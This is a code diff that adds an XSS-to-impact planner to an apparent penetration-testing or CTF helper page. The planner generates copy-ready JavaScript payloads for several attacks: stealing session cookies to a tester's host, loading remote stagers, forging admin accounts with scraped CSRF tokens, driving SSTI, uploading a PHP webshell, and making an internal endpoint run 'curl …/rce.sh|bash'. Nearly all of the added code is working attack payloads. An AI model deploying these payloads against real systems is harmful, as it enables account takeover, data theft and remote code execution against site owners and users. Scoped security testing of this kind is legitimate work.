@@ -381,6 +381,110 @@
   function legacy(text) { var ta = el("textarea"); ta.value = text; ta.style.cssText = "position:fixed;opacity:0"; document.body.appendChild(ta); ta.select(); try { document.execCommand("copy"); } catch (e) {} document.body.removeChild(ta); }
 
   // ---- live re-render + progress ----
+  // ---- XSS -> impact planner ----
+  var XSP = { type: "stored", viewer: "yes", httponly: "yes", csp: "open", next: "admin" };
+  var XSP_FIELDS = [
+    { k: "type", label: "XSS type", opts: [["stored", "Stored"], ["reflected", "Reflected"], ["blind", "Blind"], ["self", "DOM / self-only"]] },
+    { k: "viewer", label: "Privileged viewer?", opts: [["yes", "Yes — admin / bot / other user"], ["unknown", "Unknown"], ["no", "No — only me"]] },
+    { k: "httponly", label: "Session cookie HttpOnly?", opts: [["yes", "Yes"], ["no", "No"], ["unknown", "Unknown"]] },
+    { k: "csp", label: "Egress to my host", opts: [["open", "fetch() works"], ["strict", "only img / navigation"], ["unknown", "Unknown"]] },
+    { k: "next", label: "Privileged area exposes…", opts: [["admin", "Admin action (promote / create user)"], ["ssti", "Template field (SSTI)"], ["upload", "File upload"], ["cmdi", "Internal command endpoint"], ["data", "Just data / the flag in the page"]] }
+  ];
+  function buildXssPlanner() {
+    var box = $("#xss-inputs"); if (!box) return;
+    box.innerHTML = "";
+    XSP_FIELDS.forEach(function (f) {
+      var wrap = el("label", "planner-field");
+      wrap.appendChild(el("span", "planner-lbl", f.label));
+      var sel = el("select", "select"); sel.dataset.k = f.k;
+      f.opts.forEach(function (o) { var op = el("option"); op.value = o[0]; op.textContent = o[1]; if (XSP[f.k] === o[0]) op.selected = true; sel.appendChild(op); });
+      sel.addEventListener("change", function () { XSP[f.k] = sel.value; renderXssOut(); });
+      wrap.appendChild(sel); box.appendChild(wrap);
+    });
+    renderXssOut();
+  }
+  function ckExfil() {
+    return XSP.csp === "open"
+      ? "<script>fetch('http://{tester_ip}:{tester_port}/c',{method:'POST',body:document.cookie})</script>"
+      : "<script>new Image().src='http://{tester_ip}:{tester_port}/c?'+encodeURIComponent(document.cookie)</script>";
+  }
+  function srcExfil() {
+    return "<script>fetch('{target_url}/admin',{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='http://{tester_ip}:{tester_port}/a?d='+encodeURIComponent(t.slice(0,3000)))</script>";
+  }
+  function renderXssOut() {
+    var out = $("#xss-out"); if (!out) return;
+    out.innerHTML = "";
+    var steps = [], pays = [], verdict, vclass = "ok";
+
+    if (XSP.type === "self" || XSP.viewer === "no") {
+      vclass = "warn";
+      verdict = "Low value here: no privileged viewer, so your JS only runs as you (self-XSS). This rarely reaches proof. Confirm there's truly no admin/bot/other user who sees this input — if there isn't, log the finding and pivot to another vuln rather than sinking time in it.";
+    } else if (XSP.viewer === "unknown" || XSP.type === "blind") {
+      verdict = "Promising but unconfirmed: you don't yet know where it fires or as whom. Beacon FIRST (below) to prove execution and learn the context, then build the real payload.";
+    } else {
+      verdict = "Strong: your JS runs inside a privileged session. alert() is done — go straight to impact. Pick the highest rung you can reach.";
+    }
+
+    // 0. beacon for blind / unknown viewer
+    if (XSP.type === "blind" || XSP.viewer === "unknown") {
+      steps.push(["0 · Beacon first", "Prove it runs and learn the context (URL it fires on, whether you can read the cookie) before committing to a payload."]);
+      pays.push(["beacon (where + cookie)", "<img src=x onerror=\"this.src='http://{tester_ip}:{tester_port}/hit?u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie)\">"]);
+    }
+
+    // delivery
+    if (XSP.type === "reflected") steps.push(["Delivery", "Reflected → you must get a privileged user to your URL. If a bot reviews submitted content, drop the link where it'll be seen; otherwise craft and deliver the URL."]);
+    else if (XSP.type === "stored") steps.push(["Delivery", "Stored → plant once; the privileged viewer triggers it on their next visit. Load a remote stager so you can iterate without re-injecting."]);
+    if (XSP.type !== "self" && XSP.viewer !== "no") pays.push(["stager (iterate freely)", "<script src=http://{tester_ip}:{tester_port}/x.js></script>   // edit x.js on your box; the bot re-runs it next visit"]);
+
+    // session
+    if (XSP.httponly === "no") {
+      steps.push(["Session", "Cookie is NOT HttpOnly → steal it and ride the session."]);
+      pays.push(["steal cookie", ckExfil()]);
+      pays.push(["then: ride it", "scripts/ride-session.sh {target_url} 'SESSION=<stolen value>'"]);
+    } else if (XSP.httponly === "yes") {
+      steps.push(["Session", "Cookie IS HttpOnly → you can't read it, so don't try. ACT in the session instead: fetch() sends their cookie automatically."]);
+    } else {
+      steps.push(["Session", "Unknown — test it: curl -sI {target_url} | grep -i set-cookie. No HttpOnly flag → steal the cookie; HttpOnly present → act in-session (below)."]);
+    }
+
+    // top impact by what the privileged area exposes
+    var ladder = {
+      admin: ["Impact · take over / escalate (TOP)", "Do the privileged action yourself in their session. No token: fire it. Token present: GET the form, scrape the token, POST it back.",
+        [["action, no token", "<script>fetch('{target_url}/admin/promote',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'user=me&role=admin'})</script>"],
+         ["token-aware chain", "<script>fetch('{target_url}/admin/users/new',{credentials:'include'}).then(r=>r.text()).then(h=>{var t=h.match(/name=\"(?:csrf|_token|authenticity_token)\" value=\"([^\"]+)\"/)[1];fetch('{target_url}/admin/users/new',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'_token='+t+'&username=pwn&password=Pwn123!&role=admin'})})</script>"]]],
+      ssti: ["Impact · pivot to RCE via SSTI", "The privileged area has a template field. Submit an SSTI payload to it through the victim's session, then collect output. Use the exact engine payload from the SSTI phase.",
+        [["drive SSTI (Twig example)", "<script>fetch('{target_url}/admin/template',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'tpl='+encodeURIComponent(\"{{[0]|reduce('system','id')}}\")})</script>"]]],
+      upload: ["Impact · pivot to RCE via upload", "Fetch the authed upload endpoint as them and POST a webshell file; then browse to it. Swap field names/paths to the real ones (read them from the admin page/source first).",
+        [["drive upload (webshell)", "<script>var f=new FormData();f.append('file',new Blob([\"<?php system($_GET[0]);?>\"],{type:'text/php'}),'s.php');fetch('{target_url}/admin/upload',{method:'POST',credentials:'include',body:f})</script>"]]],
+      cmdi: ["Impact · pivot to RCE via internal endpoint", "The app exposes a localhost-only 'run' endpoint the bot's browser can reach (you can't, from outside). Drive it to pull and run a stager. Fix the port/param from JS or the exfiltrated source.",
+        [["drive internal RCE", "<script>fetch('http://localhost:3000/run_command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd=curl http://{tester_ip}:{tester_port}/rce.sh|bash'})</script>"]]],
+      data: ["Impact · exfil what they can see", "The flag / a hidden endpoint / secrets are often right in the privileged DOM. Read the admin page as them and ship its source to your listener; decode offline.",
+        [["read admin page + exfil", srcExfil()], ["exfil full source", "<script>location.href='http://{tester_ip}:{tester_port}/?exfil='+btoa(document.body.innerHTML)</script>"]]]
+    };
+    var top = ladder[XSP.next] || ladder.admin;
+    if (XSP.type !== "self" && XSP.viewer !== "no") {
+      steps.push([top[0], top[1]]);
+      top[2].forEach(function (p) { pays.push(p); });
+      // always remind them the flag is often just readable
+      if (XSP.next !== "data") pays.push(["also try: read the admin page", srcExfil()]);
+    }
+
+    // render verdict + steps + payloads
+    var vd = el("div", "planner-verdict " + vclass); vd.textContent = verdict; out.appendChild(vd);
+    steps.forEach(function (s) {
+      var st = el("div", "step");
+      st.appendChild(el("div", "q", s[0])); st.appendChild(el("div", "a", s[1]));
+      out.appendChild(st);
+    });
+    if (pays.length) {
+      var ph = el("div", "planner-pays");
+      ph.appendChild(el("div", "planner-lbl", "Payloads (scoped — Copy or ☆):"));
+      var cc = el("div", "cmds inset");
+      pays.forEach(function (p) { cc.appendChild(cmdRow(p[0], p[1])); });
+      ph.appendChild(cc); out.appendChild(ph);
+    }
+  }
+
   function rerender() {
     updateScopeWarn();
     document.querySelectorAll(".cmd pre").forEach(function (pre) { pre.innerHTML = fill(pre.dataset.tmpl).html; });
@@ -470,7 +574,7 @@
 
   // ---- init ----
   document.addEventListener("DOMContentLoaded", function () {
-    buildScope(); buildPhases(); buildRevshells(); buildDorks(); buildSetup(); buildFavorites();
+    buildScope(); buildPhases(); buildRevshells(); buildDorks(); buildSetup(); buildFavorites(); buildXssPlanner();
     rerender(); updateProgress(); updateFavCount();
     openShotDB(function () { renderAllShots(); });  // load saved screenshots once IndexedDB is ready
     document.querySelectorAll(".tab").forEach(function (b) { b.addEventListener("click", function () { showTab(b.dataset.tab); }); });
